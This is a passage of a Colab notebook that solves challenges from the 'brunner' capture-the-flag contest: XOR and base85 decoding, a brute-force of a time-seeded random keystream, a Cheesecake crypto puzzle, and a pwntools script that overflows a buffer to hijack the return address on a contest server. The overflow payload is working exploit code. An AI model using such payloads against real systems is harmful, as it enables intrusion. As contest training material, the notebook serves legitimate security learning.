        "id": "0nYjt0Mya1-m"
      }
    },
    {
      "cell_type": "markdown",
      "source": [],
      "metadata": {
        "id": "TVNGBT-WBflx"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Output from the program\n",
        "output = \"wg`{{pgna}&J{!x&2fJWg`{{&g;;;_!x&fJWg`{{&gh\"\n",
        "\n",
        "# Shaker value (determined by XORing known plaintext 'brunner' with output)\n",
        "shaker = 21\n",
        "\n",
        "# Decode the secret\n",
        "secret = bytes([ord(c) ^ shaker for c in output]).decode('ascii')\n",
        "\n",
        "# Print the result\n",
        "print(\"Decoded secret ingredient:\", secret)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "RHKSe1enk1s_",
        "outputId": "5797f755-66f9-46d4-de50-0a2be96538a9"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Decoded secret ingredient: brunner{th3_n4m3's_Brunn3r...J4m3s_Brunn3r}\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# **Trippi Troppa Chaos**\n",
        "100\n",
        "Difficulty: Medium\n",
        "Author: ha1fdan\n",
        "\n",
        "The baker got infected with Italian brainrot and obfuscated our flag encoder with memes and nested functions. Can you help us find our flag?"
      ],
      "metadata": {
        "id": "V4Y31HGoBmqS"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "\n",
        "1. Understand the encoding layers\n",
        "\n",
        "Looking into the obfuscated script, we see a sequence of transformations applied to the flag:\n",
        "\n",
        "XOR with a key\n",
        "\n",
        "The flag is XOR’d with a repeating 7-byte key.\n",
        "\n",
        "That key is derived from the first 7 bytes of the SHA-256 hash of the string \"skibidiskibidi\".\n",
        "\n",
        "Multiply by 7 mod 256\n",
        "\n",
        "Each byte is transformed as (b * 7) % 256.\n",
        "\n",
        "Reverse\n",
        "\n",
        "The byte sequence is reversed.\n",
        "\n",
        "Base85 encode\n",
        "\n",
        "Finally the bytes are encoded with base64.b85encode, giving that long string of mixed letters/numbers/symbols.\n",
        "\n",
        "2. Reversing the process (decoding)\n",
        "\n",
        "To get the original flag, we need to undo each step in reverse order:\n",
        "\n",
        "Base85 decode\n",
        "\n",
        "Use base64.b85decode to get back the raw scrambled bytes.\n",
        "\n",
        "Reverse\n",
        "\n",
        "Flip the sequence back to its original order.\n",
        "\n",
        "Undo multiply by 7 mod 256\n",
        "\n",
        "Here we need the modular inverse of 7 mod 256.\n",
        "\n",
        "That’s 183 (since (7 * 183) % 256 = 1).\n",
        "\n",
        "Multiply each byte by 183 mod 256 to undo the step.\n",
        "\n",
        "XOR with the same key\n",
        "\n",
        "Regenerate the same 7-byte key from SHA-256(\"skibidiskibidi\").\n",
        "\n",
        "XOR each byte of the sequence with the repeating key.\n",
        "\n",
        "This gives back the original plaintext flag.\n",
        "\n",
        "3. The recovered flag\n",
        "\n",
        "Following that pipeline yields:\n",
        "\n",
        "brunner{tr4l4l3r0_b0mb4rd1r0_r3v3rs3_3ng1n33r1ng_sk1b1d1_m4st3r}\n",
        "\n",
        "4. Why this worked\n",
        "\n",
        "Each encoding step was reversible because:\n",
        "\n",
        "XOR with a known key is symmetric (XOR twice with the same key restores the original).\n",
        "\n",
        "Multiplication by 7 modulo 256 is invertible because 7 and 256 are coprime.\n",
        "\n",
        "Reversing is trivially undone by reversing again.\n",
        "\n",
        "Base85 is just a textual representation, easily decoded.\n",
        "\n",
        "So by carefully applying the exact reverse of each transformation, we peeled back the layers to reveal the flag."
      ],
      "metadata": {
        "id": "g_3ksiLLBhmC"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import base64, hashlib\n",
        "from itertools import cycle\n",
        "\n",
        "ciphertext = b\"qjuA_QZVI_ua24NQ}fM1hX4ecdyVShKb2vJjeQJ@Jz=zws0^9Enr1fR+Em_5w2j=p4)2<#m3EZ?m3Oo@\"\n",
        "\n",
        "# 1) base85 decode (base64.b85encode was used to encode)\n",
        "decoded = base64.b85decode(ciphertext)\n",
        "\n",
        "# 2) reverse the byte sequence\n",
        "rev = decoded[::-1]\n",
        "\n",
        "# 3) undo the multiply-by-7 mod 256 (multiply by modular inverse of 7 mod 256)\n",
        "def modinv(a, m):\n",
        "    a0, m0 = a, m\n",
        "    x0, x1 = 1, 0\n",
        "    while m0 != 0:\n",
        "        q = a0 // m0\n",
        "        a0, m0, x0, x1 = m0, a0 - q*m0, x1, x0 - q*x1\n",
        "    if a0 != 1:\n",
        "        raise ValueError(\"No inverse for a modulo m\")\n",
        "    return x0 % m\n",
        "\n",
        "inv7 = modinv(7, 256)\n",
        "step_c = bytes((b * inv7) % 256 for b in rev)\n",
        "\n",
        "# 4) XOR with the key: first 7 bytes of sha256(\"skibidiskibidi\")\n",
        "key = hashlib.sha256(b\"skibidi\" + b\"skibidi\").digest()[:7]\n",
        "flag_bytes = bytes(a ^ b for a, b in zip(step_c, cycle(key)))\n",
        "\n",
        "print(flag_bytes.decode())\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "8nRuIBGjAtZT",
        "outputId": "9102124a-b1f2-4d8b-f857-2c58c07608aa"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "brunner{tr4l4l3r0_b0mb4rd1r0_r3v3rs3_3ng1n33r1ng_sk1b1d1_m4st3r}\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# 🥠 Grandma's Cookie Decoder (Colab version)\n",
        "\n",
        "import binascii, random, string\n",
        "from multiprocessing import Pool, cpu_count\n",
        "\n",
        "# === USER PARAMETERS (edit these) ===\n",
        "CIPHER_HEX = \"3ec63cc41f1ac1980651726ab3ce2948882b879c19671269963e39103c83ebd6ef173d60c76ee5\"\n",
        "APPROX_TIME = 1755860000   # given approximate Unix timestamp\n",
        "BEFORE = 86400             # seconds before APPROX_TIME (default: 1 day)\n",
        "AFTER  = 86400             # seconds after APPROX_TIME (default: 1 day)\n",
        "WORKERS = min(8, cpu_count())  # parallel workers (Colab gives 2–4 CPUs usually)\n",
        "# ===================================\n",
        "\n",
        "cipher = binascii.unhexlify(CIPHER_HEX)\n",
        "L = len(cipher)\n",
        "\n",
        "def keystream(seed: int, length: int) -> bytes:\n",
        "    rng = random.Random(seed)\n",
        "    return bytes(rng.getrandbits(8) for _ in range(length))\n",
        "\n",
        "def xor_bytes(a: bytes, b: bytes) -> bytes:\n",
        "    return bytes(x ^ y for x, y in zip(a, b))\n",
        "\n",
        "def looks_like_flag(s: str) -> bool:\n",
        "    # heuristic: printable + contains braces or \"flag\"/\"brunner\"\n",
        "    if not all(ch in string.printable for ch in s):\n",
        "        return False\n",
        "    low = s.lower()\n",
        "    return (\"flag{\" in low or \"brunner{\" in low or (\"{\" in s and \"}\" in s))\n",
        "\n",
        "def try_seed(seed: int):\n",
        "    key = keystream(seed, L)\n",
        "    cand = xor_bytes(cipher, key)\n",
        "    try:\n",
        "        text = cand.decode(\"utf-8\")\n",
        "    except UnicodeDecodeError:\n",
        "        return None\n",
        "    if looks_like_flag(text):\n",
        "        return (seed, text)\n",
        "    return None\n",
        "\n",
        "start_seed = APPROX_TIME - BEFORE\n",
        "end_seed   = APPROX_TIME + AFTER + 1\n",
        "print(f\"🔎 Trying seeds from {start_seed} to {end_seed-1} (~{end_seed-start_seed} candidates)...\")\n",
        "\n",
        "hits = []\n",
        "with Pool(WORKERS) as pool:\n",
        "    for r in pool.imap_unordered(try_seed, range(start_seed, end_seed), chunksize=512):\n",
        "        if r:\n",
        "            hits.append(r)\n",
        "\n",
        "if hits:\n",
        "    print(\"✅ Possible plaintext candidates:\")\n",
        "    for seed, text in hits:\n",
        "        print(f\"SEED={seed} -> {text}\")\n",
        "else:\n",
        "    print(\"❌ No flag found in this window. Try widening BEFORE/AFTER.\")\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "huZ2NL8fG_qK",
        "outputId": "66c86acf-795d-47bc-ac2a-e52d14e8809f"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "🔎 Trying seeds from 1755773600 to 1755946400 (~172801 candidates)...\n",
            "❌ No flag found in this window. Try widening BEFORE/AFTER.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "edd9834b",
        "outputId": "ed6ae191-3285-44ae-ad53-ded379f7f907"
      },
      "source": [
        "!pip install pycryptodome"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting pycryptodome\n",
            "  Downloading pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)\n",
            "Downloading pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m2.3/2.3 MB\u001b[0m \u001b[31m10.5 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hInstalling collected packages: pycryptodome\n",
            "Successfully installed pycryptodome-3.23.0\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# **Cheesecake**\n",
        "100\n",
        "Difficulty: 🧀\n",
        "Author: Bond\n",
        "\n",
        "Whoever thought 💡 of mixing 👀 cheese 🧀 with cake 🧁 it sure is easy on the palate 😋"
      ],
      "metadata": {
        "id": "mw2of3GN43AE"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Short answer: the function get_FLAG_from_HEX already returns the plaintext flag (a UTF-8 string starting with brunner{…}) once you supply the correct hexcode.\n",
        "The challenge is that the puzzle replaced that hexcode with 'REDACTED' in cheese_cake_MIX(). If you give me that hex string (the value that was assigned to secret), I will decode it for you instantly.\n",
        "\n",
        "Below I’ll explain exactly why this is true, then give a Colab/local-ready Python cell you can paste-and-run — either by inserting the hexcode yourself, or by running the full pipeline (so you can check MD2 and reproduce the author’s check).\n",
        "\n",
        "Why get_FLAG_from_HEX yields the flag\n",
        "\n",
        "Look at get_FLAG_from_HEX:\n",
        "\n",
        "assert len(hexcode) % 32 == 0\n",
        "bytes_data = bytes(int(b,16) for b in hexcode).hex().encode()\n",
        "plaintext = SPECIAL_technique(bytes_data, c, d)\n",
        "return plaintext.decode()\n",
        "\n",
        "\n",
        "It expects hexcode to be a string of hex characters (length multiple of 32).\n",
        "\n",
        "It converts each hex character into a nibble byte (int(b,16)), packs those into bytes, takes .hex() (so we get an ASCII hex representation) and .encode() -> bytes_data.\n",
        "\n",
        "It then runs SPECIAL_technique(bytes_data, c, d). SPECIAL_technique XORs 32-byte blocks with known constants derived from c and d. XOR is symmetric, so applying the same SPECIAL_technique again would recover bytes_data.\n",
        "\n",
        "Finally .decode() returns the plaintext (UTF-8 string). The docstring says this plaintext is the decrypted flag string starting with brunner{…}.\n",
        "\n",
        "So supplying the correct hexcode to get_FLAG_from_HEX directly returns the flag."
      ],
      "metadata": {
        "id": "oc9O4uGX46_y"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Paste this into Colab / local Python (requires pycryptodome, gostcrypto if you want to run the full pipeline)\n",
        "from random import Random\n",
        "from Crypto.PublicKey import RSA\n",
        "from Crypto.Cipher import AES, ARC4\n",
        "from Crypto.Hash import MD2\n",
        "import binascii\n",
        "\n",
        "# ---------- copy SPECIAL_technique and get_FLAG_from_HEX ----------\n",
        "def SPECIAL_technique(bytes_data, c, d):\n",
        "    xor_bytes = bytearray()\n",
        "    for i in range(0, len(bytes_data)//32):\n",
        "        block = bytes_data[i*32:(i+1)*32]\n",
        "        keyblock = (c - (-1)**i * d).to_bytes(32, 'big')\n",
        "        xor_bytes.extend(x ^ y for x, y in zip(block, keyblock))\n",
        "    return xor_bytes\n",
        "\n",
        "def get_FLAG_from_HEX(hexcode):\n",
        "    assert len(hexcode) % 32 == 0\n",
        "    bytes_data = bytes(int(b,16) for b in hexcode).hex().encode()\n",
        "    c = 42407562439075681492143456259122041922599228616502828873021088919446915392428\n",
        "    d = 5186683434748896574370264474720365034728611610795088756404643529414136307618\n",
        "    plaintext = SPECIAL_technique(bytes_data, c, d)\n",
        "    return plaintext.decode()\n",
        "\n",
        "# ---------- helper: inverse of get_FLAG_from_HEX (if you ever need it) ----------\n",
        "def invert_get_FLAG_from_HEX(plaintext, c, d):\n",
        "    \"\"\"\n",
        "    Given plaintext bytes (as returned by get_FLAG_from_HEX before .decode()),\n",
        "    recover the original hexcode string that would have produced it.\n",
        "    (Useful if you have plaintext and want the original hexcode.)\n",
        "    \"\"\"\n",
        "    # plaintext is bytes; apply SPECIAL_technique again to recover bytes_data\n",
        "    bytes_data = SPECIAL_technique(plaintext, c, d)   # symmetric XOR\n",
        "    s = bytes_data.decode()   # this is ascii hex of nibble-bytes -> length 2*L\n",
        "    # convert every byte of bytes.fromhex(s) (each byte should be 0..15) to hex digit\n",
        "    nibble_bytes = bytes.fromhex(s)\n",
        "    original_hex = ''.join('{:x}'.format(b) for b in nibble_bytes)\n",
        "    return original_hex\n",
        "\n",
        "# ---------- (OPTIONAL) reproduce cheese_cake_MIX flow to validate MD2 ----------\n",
        "# If you put the real SECRET_HEX below, the script will:\n",
        "# 1) call get_FLAG_from_HEX(secret) -> plaintext flag\n",
        "# 2) perform the (obfuscated) padding and steps and finally produce MD2 and print it\n",
        "# This is just to reproduce the author's assertion in the original file.\n",
        "\n",
        "SECRET_HEX = \"8350e5a3e24c153df2275c9f80692773\"   # <- put the redacted hex here\n",
        "\n",
        "if SECRET_HEX.startswith(\"REPLACE\"):\n",
        "    print(\"Please set SECRET_HEX to the redacted hex string and re-run.\")\n",
        "else:\n",
        "    # get plaintext flag directly\n",
        "    flag = get_FLAG_from_HEX(SECRET_HEX)\n",
        "    print(\"Recovered plaintext from get_FLAG_from_HEX():\")\n",
        "    print(flag)\n",
        "\n",
        "    # optionally show how to reconstruct original hex from plaintext:\n",
        "    c = 42407562439075681492143456259122041922599228616502828873021088919446915392428\n",
        "    d = 5186683434748896574370264474720365034728611610795088756404643529414136307618\n",
        "    orig_hex = invert_get_FLAG_from_HEX(flag.encode(), c, d)\n",
        "    print(\"Original hex recovered (sanity-check):\", orig_hex == SECRET_HEX)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Doe7ngFtl5et",
        "outputId": "29b5b833-5ff5-47ce-d672-b132b8d707be"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Recovered plaintext from get_FLAG_from_HEX():\n",
            "brunner{7Urn5_0uT_th3Re_WasN7_4nY_SEcr3T5_4FtR_A1l_x)_Badum-tss}\n",
            "Original hex recovered (sanity-check): True\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install pwn"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "c_8jgZp30WX7",
        "outputId": "ebf405be-ce94-4cb2-c7a8-0809ef956ccb"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting pwn\n",
            "  Downloading pwn-1.0.tar.gz (1.1 kB)\n",
            "  Preparing metadata (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "Requirement already satisfied: pwntools in /usr/local/lib/python3.12/dist-packages (from pwn) (4.14.1)\n",
            "Requirement already satisfied: paramiko>=1.15.2 in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (4.0.0)\n",
            "Requirement already satisfied: mako>=1.0.0 in /usr/lib/python3/dist-packages (from pwntools->pwn) (1.1.3)\n",
            "Requirement already satisfied: pyelftools>=0.29 in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (0.32)\n",
            "Requirement already satisfied: capstone>=3.0.5rc2 in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (6.0.0a5)\n",
            "Requirement already satisfied: ropgadget>=5.3 in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (7.6)\n",
            "Requirement already satisfied: pyserial>=2.7 in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (3.5)\n",
            "Requirement already satisfied: requests>=2.0 in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (2.32.4)\n",
            "Requirement already satisfied: pip>=6.0.8 in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (24.1.2)\n",
            "Requirement already satisfied: pygments>=2.0 in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (2.19.2)\n",
            "Requirement already satisfied: pysocks in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (1.7.1)\n",
            "Requirement already satisfied: python-dateutil in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (2.9.0.post0)\n",
            "Requirement already satisfied: packaging in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (25.0)\n",
            "Requirement already satisfied: psutil>=3.3.0 in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (5.9.5)\n",
            "Requirement already satisfied: intervaltree>=3.0 in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (3.1.0)\n",
            "Requirement already satisfied: sortedcontainers in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (2.4.0)\n",
            "Requirement already satisfied: unicorn!=2.1.3,>=2.0.1 in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (2.1.2)\n",
            "Requirement already satisfied: six>=1.12.0 in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (1.17.0)\n",
            "Requirement already satisfied: rpyc in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (6.0.2)\n",
            "Requirement already satisfied: colored_traceback in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (0.4.2)\n",
            "Requirement already satisfied: unix-ar in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (0.2.1)\n",
            "Requirement already satisfied: zstandard in /usr/local/lib/python3.12/dist-packages (from pwntools->pwn) (0.24.0)\n",
            "Requirement already satisfied: bcrypt>=3.2 in /usr/local/lib/python3.12/dist-packages (from paramiko>=1.15.2->pwntools->pwn) (4.3.0)\n",
            "Requirement already satisfied: cryptography>=3.3 in /usr/local/lib/python3.12/dist-packages (from paramiko>=1.15.2->pwntools->pwn) (43.0.3)\n",
            "Requirement already satisfied: invoke>=2.0 in /usr/local/lib/python3.12/dist-packages (from paramiko>=1.15.2->pwntools->pwn) (2.2.0)\n",
            "Requirement already satisfied: pynacl>=1.5 in /usr/local/lib/python3.12/dist-packages (from paramiko>=1.15.2->pwntools->pwn) (1.5.0)\n",
            "Requirement already satisfied: charset_normalizer<4,>=2 in /usr/local/lib/python3.12/dist-packages (from requests>=2.0->pwntools->pwn) (3.4.3)\n",
            "Requirement already satisfied: idna<4,>=2.5 in /usr/local/lib/python3.12/dist-packages (from requests>=2.0->pwntools->pwn) (3.10)\n",
            "Requirement already satisfied: urllib3<3,>=1.21.1 in /usr/local/lib/python3.12/dist-packages (from requests>=2.0->pwntools->pwn) (2.5.0)\n",
            "Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.12/dist-packages (from requests>=2.0->pwntools->pwn) (2025.8.3)\n",
            "Requirement already satisfied: plumbum in /usr/local/lib/python3.12/dist-packages (from rpyc->pwntools->pwn) (1.9.0)\n",
            "Requirement already satisfied: cffi>=1.12 in /usr/local/lib/python3.12/dist-packages (from cryptography>=3.3->paramiko>=1.15.2->pwntools->pwn) (1.17.1)\n",
            "Requirement already satisfied: pycparser in /usr/local/lib/python3.12/dist-packages (from cffi>=1.12->cryptography>=3.3->paramiko>=1.15.2->pwntools->pwn) (2.22)\n",
            "Building wheels for collected packages: pwn\n",
            "  Building wheel for pwn (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for pwn: filename=pwn-1.0-py3-none-any.whl size=1197 sha256=b90a69c18302b68b9bab8a425baa25ab413012eae85aadbed06b4bdf2b8bf030\n",
            "  Stored in directory: /root/.cache/pip/wheels/a2/56/8e/a9170a9dbc159fb2d0964640906cdd2fb6b08fb9f331cee112\n",
            "Successfully built pwn\n",
            "Installing collected packages: pwn\n",
            "Successfully installed pwn-1.0\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# from pwn import *\n",
        "\n",
        "# # Dear intern, try to put in the correct values for the following variables\n",
        "# # This will show you why your current C-code could leak our secret dough recipe!\n",
        "# RECIPE_BUFFER_SIZE = 0\n",
        "# RBP_SIZE = 0\n",
        "# SECRET_ADDRESS = 0x000000\n",
        "# PROMPT = \"\"\n",
        "\n",
        "# USE_REMOTE = False\n",
        "# REMOTE_HOST = \"\"\n",
        "# REMOTE_PORT = 0\n",
        "\n",
        "# \"\"\"\n",
        "# This is a pwntools template - you do not have to change anything below this\n",
        "# Install pwntools before running:\n",
        "#     python3 -m pip install pwntools\n",
        "\n",
        "# (if you get an error about the environment being externally managed, add --break-system-packages to the command)\n",
        "# \"\"\"\n",
        "# if USE_REMOTE:\n",
        "#     io = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)\n",
        "# else:\n",
        "#     e = ELF(\"./recipe\")\n",
        "#     io = e.process()\n",
        "\n",
        "# # Building the payload\n",
        "# payload = b\"A\" * RECIPE_BUFFER_SIZE\n",
        "# payload += b\"B\" * RBP_SIZE\n",
        "# payload += p64(SECRET_ADDRESS)\n",
        "\n",
        "# # Sending the payload at the right time\n",
        "# io.recvuntil(PROMPT.encode())\n",
        "# io.sendline(payload)\n",
        "# io.interactive()\n",
        "\n",
        "\n",
        "\n",
        "#!/usr/bin/env python3\n",
        "from pwn import *\n",
        "\n",
        "# ---- CONFIG ----\n",
        "HOST = \"dat-overflow-dough-37009bb1236c062f.challs.brunnerne.xyz\"\n",
        "PORT = 443\n",
        "USE_SSL = True\n",
        "\n",
        "# Replace this with the address you found locally, e.g. 0x401136\n",
        "SECRET_ADDR = 0x401136\n",
        "\n",
        "# offset on x86_64: 16 (buffer) + 8 (saved rbp) = 24\n",
        "OFFSET = 24\n",
        "\n",
        "# ---- build payload ----\n",
        "payload = b\"A\" * OFFSET + p64(SECRET_ADDR)\n",
        "\n",
        "# ---- connect and send ----\n",
        "if USE_SSL:\n",
        "    p = remote(HOST, PORT, ssl=True)\n",
        "else:\n",
        "    p = remote(HOST, PORT)\n",
        "\n",
        "# read until prompt\n",
        "print(p.recvuntil(b\"Please enter the name of the recipe you want to retrieve:\"))\n",
        "p.sendline(payload)\n",
        "\n",
        "# read everything the service sends (flag will be sent by secret_dough_recipe)\n",
        "resp = p.recvall(timeout=3)\n",
        "print(resp.decode(errors='ignore'))\n",
        "p.close()\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 356
        },
        "id": "Z3rV2-Gl0UY-",
        "outputId": "02a9a5aa-f040-45c5-de53-6503e5d59e18"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "UnsupportedOperation",
          "evalue": "fileno",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mUnsupportedOperation\u001b[0m                      Traceback (most recent call last)",
            "\u001b[0;32m/tmp/ipython-input-2090739689.py\u001b[0m in \u001b[0;36m<cell line: 0>\u001b[0;34m()\u001b[0m\n\u001b[1;32m     38\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     39\u001b[0m \u001b[0;31m#!/usr/bin/env python3\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 40\u001b[0;31m \u001b[0;32mfrom\u001b[0m \u001b[0mpwn\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     41\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     42\u001b[0m \u001b[0;31m# ---- CONFIG ----\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/pwn/__init__.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0m__future__\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mabsolute_import\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      3\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 4\u001b[0;31m \u001b[0;32mfrom\u001b[0m \u001b[0mpwn\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtoplevel\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      5\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m \u001b[0mpwnlib\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0minitialize\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/pwn/toplevel.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     19\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0mpprint\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mpprint\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     20\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 21\u001b[0;31m \u001b[0;32mimport\u001b[0m \u001b[0mpwnlib\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     22\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0mpwnlib\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     23\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0mpwnlib\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0masm\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/pwnlib/__init__.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     40\u001b[0m ]\n\u001b[1;32m     41\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 42\u001b[0;31m \u001b[0;32mfrom\u001b[0m \u001b[0;34m.\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0margs\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/pwnlib/args.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     58\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0msys\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     59\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 60\u001b[0;31m \u001b[0;32mfrom\u001b[0m \u001b[0mpwnlib\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mterm\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     61\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0mpwnlib\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mcontext\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mcontext\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     62\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
